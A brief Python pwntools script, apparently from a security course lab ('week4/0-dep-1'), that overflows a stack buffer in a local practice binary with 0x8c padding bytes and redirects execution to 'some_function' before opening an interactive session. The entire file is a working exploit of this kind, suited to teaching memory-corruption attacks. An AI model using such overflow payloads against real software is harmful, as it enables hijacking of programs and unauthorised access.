#!/usr/bin/env python

from pwn import *
import os

env = {
    'PATH': '/home/users/hobbes/week4/0-dep-1/',
}

context.terminal = ['tmux', 'splitw', '-h']
p = process('./dep-1', env=env)
#gdb.attach(p)

e = ELF('./dep-1')
someAddr = e.symbols['some_function']

payload = "A" * 0x8c + p32(someAddr)

p.sendline(payload)

print(p.recv())

p.interactive()
